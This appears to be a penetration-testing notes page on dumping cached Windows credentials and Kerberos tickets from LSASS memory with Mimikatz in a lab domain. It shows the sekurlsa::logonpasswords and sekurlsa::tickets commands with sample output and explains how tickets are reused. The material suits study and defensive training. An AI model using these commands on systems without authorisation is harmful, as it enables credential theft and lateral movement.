# Cached Credentials

With the Microsoft implementation of Kerberos, single sign-ons and  password hashes must be stored locally somewhere for Ticket Granting Ticket (TGT) renewal. In current versions of Windows, these are stored in the Local Security Authority Subscription Service (LSASS) memory space.

If we were able to access these hashes, they would be able to be cracked to obtain cleartext passwords or to gain the ability to reuse them in various attacks vectors. However LSASS runs as SYSTEM, so either SYSTEM or local administrator privileges are required to access the hashes on the system. One such way to access these hashes is through the use of the [Mimikatz](https://github.com/gentilkiwi/mimikatz) tool by gentilkiwi.&#x20;

{% hint style="info" %}
Run mimikatz as local administrator / SYSTEM
{% endhint %}

### Utilising mimikatz to dump hashes for logged on users

```
C:\Temp> mimikatz.exe
...mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 10180072 (00000000:009b55e8)
Session           : CachedInteractive from 1
User Name         : Administrator
Domain            : FUTURAMA
Logon Server      : BENDER
Logon Time        : 26/04/2022 2:23:05 PM
SID               : S-1-5-21-2077362827-86612838-3931147236-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : FUTURAMA
         * NTLM     : HASH
         * SHA1     : HASH
         * DPAPI    : HASH
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : FUTURAMA
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : FUTURAMA.LOCAL
         * Password : (null)
        ssp :
        credman :
        cloudap :       KO
...
```

Windows 2003 - NTLM\
Windows Server 2008 and above - NTLM and SHA-1\
WDigest maybe required from Windows 7 or systems where it is manually set, with this set, mimikatz will reveal cleartext passwords alongside hashes.

### Using mimikatz to access tickets.

```
mimikatz # sekurlsa::tickets

Authentication Id : 0 ; 7024400 (00000000:006b2f10)
Session           : CachedInteractive from 1
User Name         : Administrator
Domain            : FUTURAMA
Logon Server      : BENDER
Logon Time        : 26/04/2022 11:15:02 AM
SID               : S-1-5-21-2077362827-86612838-3931147236-500

         * Username : Administrator
         * Domain   : FUTURAMA.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 26/04/2022 12:07:32 PM ; 26/04/2022 10:07:32 PM ; 3/05/2022 12:07:32 PM
           Service Name (02) : ldap ; Bender.FUTURAMA.local ; @ FUTURAMA.LOCAL
           Target Name  (02) : ldap ; Bender.FUTURAMA.local ; @ FUTURAMA.LOCAL
           Client Name  (01) : Administrator ; @ FUTURAMA.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             2ee98bd16fa64999caee02f759bb2c2ff86e9d1d7487e6b3455fc4aa6c45ff8f
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 4        [...]
         [00000001]
           Start/End/MaxRenew: 26/04/2022 12:07:32 PM ; 26/04/2022 10:07:32 PM ; 3/05/2022 12:07:32 PM
           Service Name (02) : ldap ; Bender.FUTURAMA.local ; FUTURAMA.local ; @ FUTURAMA.LOCAL
           Target Name  (02) : ldap ; Bender.FUTURAMA.local ; FUTURAMA.local ; @ FUTURAMA.LOCAL
           Client Name  (01) : Administrator ; @ FUTURAMA.LOCAL ( FUTURAMA.LOCAL )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             2293eae7c6eeba145203519300361c54af587ccdf3b411b50e9e636c1e33c63e
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 4        [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 26/04/2022 12:07:32 PM ; 26/04/2022 10:07:32 PM ; 3/05/2022 12:07:32 PM
           Service Name (02) : krbtgt ; FUTURAMA.LOCAL ; @ FUTURAMA.LOCAL
           Target Name  (02) : krbtgt ; FUTURAMA.LOCAL ; @ FUTURAMA.LOCAL
           Client Name  (01) : Administrator ; @ FUTURAMA.LOCAL ( FUTURAMA.LOCAL )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             4b3e2c9184916b7e91ca04925108c4b95897c48957b81cee0b4662a738476d10
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
```

{% hint style="info" %}
TGS will only allow access those particular resources. TGT will be used to request TGS for specific services we wish to target.
{% endhint %}

### TGT vs TGS

The TGT can only be used on the machine it was created for, but can request a TGS for any resource required.\
The TGS can be used locally and else where in the domain, but only for that resource.
